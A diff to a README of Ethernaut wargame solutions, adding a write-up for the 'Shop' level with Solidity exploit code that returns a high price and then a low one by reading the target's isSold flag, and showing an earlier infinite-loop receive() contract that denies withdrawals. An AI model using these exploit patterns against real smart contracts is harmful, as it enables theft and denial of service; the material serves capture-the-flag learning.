@@ -52,6 +52,7 @@ yarn start -- <level_name>
  - [19. Magic Number](#19-magic-number)
  - [20. Alien Codex](#20-alien-codex)
  - [21. Denial](#21-denial)
+ - [22. Shop](#22-shop)
 
 ### 1. Hello Ethernaut
 
@@ -883,7 +884,7 @@ Our partner contract should look as follows
 contract Partner {
     receive() external payable {
         while (true) {
-          
+
         }
     }
 }
@@ -895,3 +896,31 @@ Then set the contract as a partner
 await contract.setWithdrawPartner('<your_contract_address>')
 ```
 
+---
+
+### 22. Shop
+
+In this level, the challenge is to implement a contract with a `price()` function that returns a value equals or greater than 100 in the first call and then returns a value below 100.
+
+Note that we cannot mutate the state of the contract because `price()` is marked with a `view` modifier. So the key is to somehow detect what call is the one that will mutate the price and return a lower value in that case.
+
+Note that in the `buy()` function of the Shop contract, there is a boolean variable called `isSold` that is set to true after the condition, so we can use it as the reference to change our return value.
+
+```sol
+function price() public view returns(uint) {
+    bool isSold = Sender(msg.sender).isSold();
+    if (isSold) {
+        return 0;
+    } else {
+        return 100;
+    }
+}
+```
+
+Then we just call the `buy()` function from the same contract and it should work.
+
+```sol
+function buy(address _shop) public {
+    Sender(_shop).buy();
+}
+```
